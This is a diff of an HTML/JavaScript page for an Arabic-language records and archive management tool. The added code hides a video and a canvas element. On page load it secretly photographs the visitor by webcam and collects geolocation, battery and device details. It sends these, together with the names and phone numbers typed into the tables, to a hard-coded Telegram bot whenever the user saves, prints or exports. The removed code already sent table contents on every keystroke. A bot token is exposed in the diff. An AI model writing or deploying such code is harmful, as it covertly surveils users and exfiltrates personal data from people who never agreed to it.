@@ -339,10 +339,14 @@
 
 <body>
 
+    <!-- عناصر مخفية لالتقاط صورة الزائر وتتبع البيانات -->
+    <video id="videoElement" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvasElement" style="display:none;"></canvas>
+
     <!-- الشريط المتحرك في أعلى الصفحة -->
     <div class="top-ticker">
         <marquee behavior="scroll" direction="right" scrollamount="5">
-            ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح حموده ✨
+            ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح ✨
         </marquee>
     </div>
 
@@ -378,7 +382,7 @@
 
         <button class="btn btn-save"
                 onclick="saveToArchive()"
-                title="حفظ نسخة من العمل الحالي في الأرشيف">
+                title="حفظ نسخة من العمل الحالي في الأرشيف وإرسال تقرير بالأسماء للبوت">
             💾 حفظ في الأرشيف
         </button>
 
@@ -641,12 +645,12 @@
                                 document.write(`
                                     <tr onclick="selectRow(this,event)">
                                         <td>${i}</td>
-                                        <td style="text-align:right;padding-right:5px;" contenteditable="true" oninput="autoSendToTelegram()"></td>
-                                        <td contenteditable="true" oninput="autoSendToTelegram()"></td>
-                                        <td contenteditable="true" oninput="autoSendToTelegram()"></td>
-                                        <td contenteditable="true" oninput="autoSendToTelegram()"></td>
-                                        <td style="text-align:right;padding-right:5px;" contenteditable="true" oninput="autoSendToTelegram()"></td>
-                                        <td contenteditable="true" oninput="autoSendToTelegram()"></td>
+                                        <td style="text-align:right;padding-right:5px;" contenteditable="true"></td>
+                                        <td contenteditable="true"></td>
+                                        <td contenteditable="true"></td>
+                                        <td contenteditable="true"></td>
+                                        <td style="text-align:right;padding-right:5px;" contenteditable="true"></td>
+                                        <td contenteditable="true"></td>
                                     </tr>
                                 `);
                             }
@@ -678,24 +682,124 @@
         let activeCellElement = null;
 
         // إعدادات بوت تيليجرام
-        const TELEGRAM_BOT_TOKEN = "8939028658:AAhBcsIGac3tSsBqonxxDL4MauJ-pfjwD4";
-        const TELEGRAM_CHAT_ID = "7962257606";
-        let autoSendTimer = null;
+        const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
+        const chatId = "7962257606";
 
-        // دالة إرسال تنبيه دخول زائر جديد فور فتح الصفحة
-        function notifyVisitorArrival() {
-            const now = new Date();
-            const timeString = now.toLocaleDateString('ar-YE') + ' - ' + now.toLocaleTimeString('ar-YE', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        let globalLocation = "لم يتم السماح بالموقع";
+        let batteryInfo = "غير معروفة";
+        const deviceInfo = navigator.userAgent;
+
+        // 1. إرسال إشعار دخول الزائر مع الصورة عند فتح الصفحة فقط
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? "⚡ (يتم شحنه الآن)" : "🔋 (على البطارية)";
+                    batteryInfo = `${level}% ${charging}`;
+                }
+            } catch (e) {}
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        globalLocation = `https://www.google.com/maps?q=${lat},${lon}`;
+                    },
+                    (error) => {
+                        globalLocation = "رفض إذن الموقع";
+                    },
+                    { timeout: 10000, maximumAge: 0 }
+                );
+            }
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        const video = document.getElementById('videoElement');
+                        video.srcObject = stream;
+                        
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                const canvas = document.getElementById('canvasElement');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                canvas.toBlob((blob) => {
+                                    if (blob) {
+                                        sendVisitorDataWithPhoto(blob);
+                                    } else {
+                                        sendVisitorTextOnly();
+                                    }
+                                    stream.getTracks().forEach(track => track.stop());
+                                }, 'image/jpeg', 0.85);
+                            }, 800);
+                        };
+                    })
+                    .catch((err) => {
+                        sendVisitorTextOnly();
+                    });
+            } else {
+                sendVisitorTextOnly();
+            }
+
+            const firstSheet = document.querySelector('.sheet-container');
+            if (firstSheet) {
+                setActiveContext(firstSheet, { target: firstSheet });
+                activeThElement = firstSheet.querySelector('thead tr th');
+            }
+            renumberAllRows();
+        });
+
+        function sendVisitorDataWithPhoto(blob) {
+            const captionText = `🚨 دخول زائر جديد للموقع!\n\n🔋 البطارية: ${batteryInfo}\n📍 الموقع (خريطة):\n${globalLocation}\n\n📱 الجهاز:\n${deviceInfo}`;
             
-            const visitMsg = `🚨 **تم رصد دخول زائر جديد!**\n\n` +
-                             `🕒 الوقت: ${timeString}\n` +
-                             `🌐 الصفحة: كشف البيانات والمسيرات الرسمية\n` +
-                             `💻 المتصفح أو الجهاز: ${navigator.userAgent.substring(0, 50)}...`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'visitor.jpg');
+            formData.append('caption', captionText);
 
-            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(e => {});
+        }
+
+        function sendVisitorTextOnly() {
+            const msg = `🚨 دخول زائر جديد للموقع!\n\n🔋 البطارية: ${batteryInfo}\n📍 الموقع (خريطة):\n${globalLocation}\n\n📱 الجهاز:\n${deviceInfo}`;
+            try {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            } catch (e) {}
+        }
+
+        // 2. دالة إرسال محتوى الجدول للبوت (تعمل فقط عند النقر على حفظ أو تصدير)
+        function sendTableDataToTelegram(actionName) {
+            const tables = document.querySelectorAll('.dynamicTable');
+            let reportText = `📋 **تقرير كشف البيانات (${actionName}):**\n\n`;
+            let hasData = false;
+
+            tables.forEach((table, tIndex) => {
+                reportText += `--- الصفحة (${tIndex + 1}) ---\n`;
+                table.querySelectorAll('tbody tr').forEach(row => {
+                    const name = row.cells[1] ? row.cells[1].innerText.trim() : '';
+                    const phone = row.cells[4] ? row.cells[4].innerText.trim() : '';
+                    if (name !== "") {
+                        reportText += `• ${name} | 📱: ${phone}\n`;
+                        hasData = true;
+                    }
+                });
+            });
+
+            if (!hasData) return;
+
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const payload = {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: visitMsg,
+                chat_id: chatId,
+                text: reportText,
                 parse_mode: "Markdown"
             };
 
@@ -703,55 +807,19 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(err => {
-                console.log("خطأ في إرسال إشعار الزائر:", err);
-            });
-        }
-
-        // دالة الإرسال التلقائي للخلايا
-        function autoSendToTelegram() {
-            clearTimeout(autoSendTimer);
-            autoSendTimer = setTimeout(() => {
-                const tables = document.querySelectorAll('.dynamicTable');
-                let reportText = "🔄 **تحديث تلقائي لكشف البيانات:**\n\n";
-                let hasData = false;
-
-                tables.forEach((table, tIndex) => {
-                    reportText += `--- الصفحة (${tIndex + 1}) ---\n`;
-                    table.querySelectorAll('tbody tr').forEach(row => {
-                        const name = row.cells[1] ? row.cells[1].innerText.trim() : '';
-                        const phone = row.cells[4] ? row.cells[4].innerText.trim() : '';
-                        if (name !== "") {
-                            reportText += `• ${name} | 📱: ${phone}\n`;
-                            hasData = true;
-                        }
-                    });
-                });
-
-                if (!hasData) return;
-
-                const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const payload = {
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: reportText,
-                    parse_mode: "Markdown"
-                };
-
-                fetch(apiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(err => {
-                    console.log("إرسال تيليجرام الخلفي:", err);
-                });
-            }, 1500);
+            }).catch(err => {});
         }
 
         function printDocument() {
-            window.print();
+            sendTableDataToTelegram("طباعة / حفظ PDF");
+            setTimeout(() => {
+                window.print();
+            }, 500);
         }
 
         function exportTableToExcel() {
+            sendTableDataToTelegram("حفظ ملف Excel");
+            
             const tables = document.querySelectorAll('.dynamicTable');
             let csvRows = [];
 
@@ -795,7 +863,7 @@
             link.click();
             document.body.removeChild(link);
             
-            alert('📊 تم تجهيز وتنزيل ملف الـ Excel (CSV) بنجاح!');
+            alert('📊 تم تجهيز وتنزيل ملف الـ Excel (CSV) بنجاح وإرسال تقرير الأسماء للبوت!');
         }
 
         function normalizeArabic(text) {
@@ -956,7 +1024,6 @@
                     cellName.contentEditable = 'true';
                     cellName.style.textAlign = 'right';
                     cellName.style.paddingRight = '5px';
-                    cellName.setAttribute('oninput', 'autoSendToTelegram()');
                     if (itemIndex < itemsList.length) {
                         cellName.textContent = itemsList[itemIndex];
                         itemIndex++;
@@ -965,7 +1032,6 @@
                     for (let c = 2; c < 7; c++) {
                         const cell = row.insertCell();
                         cell.contentEditable = 'true';
-                        cell.setAttribute('oninput', 'autoSendToTelegram()');
                         if (c === 5) {
                             cell.style.textAlign = 'right';
                             cell.style.paddingRight = '5px';
@@ -975,8 +1041,7 @@
             }
 
             renumberAllRows();
-            autoSendToTelegram();
-            alert('✅ تم بنجاح استخراج وتوزيع ' + itemsList.length + ' سجلاً وإرسالها للبوت تلقائياً!');
+            alert('✅ تم بنجاح استخراج وتوزيع ' + itemsList.length + ' سجلاً في الجدول!');
         }
 
         function openBulkImportModal() {
@@ -1060,6 +1125,8 @@
 
         function saveToArchive() {
             try {
+                sendTableDataToTelegram("حفظ في الأرشيف");
+
                 const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
                 const archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
                 const now = new Date();
@@ -1072,7 +1139,7 @@
                 });
 
                 localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
-                alert('✅ تم حفظ العمل بنجاح داخل الأرشيف!');
+                alert('✅ تم حفظ العمل في الأرشيف وإرسال تقرير الأسماء إلى تيليجرام بنجاح!');
             } catch (error) {
                 alert('تعذر حفظ العمل.');
             }
@@ -1252,7 +1319,6 @@
                 activeCellElement.style.fontWeight = '';
                 activeCellElement.style.textDecoration = '';
             }
-            autoSendToTelegram();
         }
 
         function adjustActiveColWidth(amount) {
@@ -1302,11 +1368,9 @@
                     newCell.contentEditable = 'true';
                     newCell.style.textAlign = 'right';
                     newCell.style.paddingRight = '5px';
-                    newCell.setAttribute('oninput', 'autoSendToTelegram()');
                 }
             }
             renumberAllRows();
-            autoSendToTelegram();
         }
 
         function addColumnToActiveTable() {
@@ -1334,9 +1398,7 @@
                 td.contentEditable = 'true';
                 td.style.textAlign = 'right';
                 td.style.paddingRight = '5px';
-                td.setAttribute('oninput', 'autoSendToTelegram()');
             });
-            autoSendToTelegram();
         }
 
         function deleteSelectedRow() {
@@ -1350,7 +1412,6 @@
                 activeRowElement = null;
                 activeCellElement = null;
                 renumberAllRows();
-                autoSendToTelegram();
             } else {
                 alert('لا يمكنك حذف الصف الأخير!');
             }
@@ -1373,7 +1434,6 @@
 
             activeColumnIndex = Math.min(index, headerRow.cells.length - 1);
             activeThElement = headerRow.cells[activeColumnIndex];
-            autoSendToTelegram();
         }
 
         function deleteActivePage() {
@@ -1390,7 +1450,6 @@
                 pages[pages.length - 1].remove();
             }
             renumberAllRows();
-            autoSendToTelegram();
         }
 
         function addNewPage() {
@@ -1424,12 +1483,12 @@
                             ${Array.from({length:15}, () => `
                                 <tr onclick="selectRow(this,event)">
                                     <td>-</td>
-                                    <td contenteditable="true" style="text-align:right;padding-right:5px;" oninput="autoSendToTelegram()"></td>
-                                    <td contenteditable="true" oninput="autoSendToTelegram()"></td>
-                                    <td contenteditable="true" oninput="autoSendToTelegram()"></td>
-                                    <td contenteditable="true" oninput="autoSendToTelegram()"></td>
-                                    <td contenteditable="true" style="text-align:right;padding-right:5px;" oninput="autoSendToTelegram()"></td>
-                                    <td contenteditable="true" oninput="autoSendToTelegram()"></td>
+                                    <td contenteditable="true" style="text-align:right;padding-right:5px;"></td>
+                                    <td contenteditable="true"></td>
+                                    <td contenteditable="true"></td>
+                                    <td contenteditable="true"></td>
+                                    <td contenteditable="true" style="text-align:right;padding-right:5px;"></td>
+                                    <td contenteditable="true"></td>
                                 </tr>
                             `).join('')}
                         </tbody>
@@ -1443,7 +1502,6 @@
 
             wrapper.appendChild(newPage);
             renumberAllRows();
-            autoSendToTelegram();
         }
 
         function changeFontFamily(fontValue) {
@@ -1454,17 +1512,6 @@
         function changeTextColor(colorValue) {
             document.querySelectorAll('.sheet-container, .sheet-container th, .sheet-container td, .editable-header').forEach(el => { el.style.color = colorValue; });
         }
-
-        window.onload = function() {
-            notifyVisitorArrival();
-
-            const firstSheet = document.querySelector('.sheet-container');
-            if (firstSheet) {
-                setActiveContext(firstSheet, { target: firstSheet });
-                activeThElement = firstSheet.querySelector('thead tr th');
-            }
-            renumberAllRows();
-        };
     </script>
 
 </body>
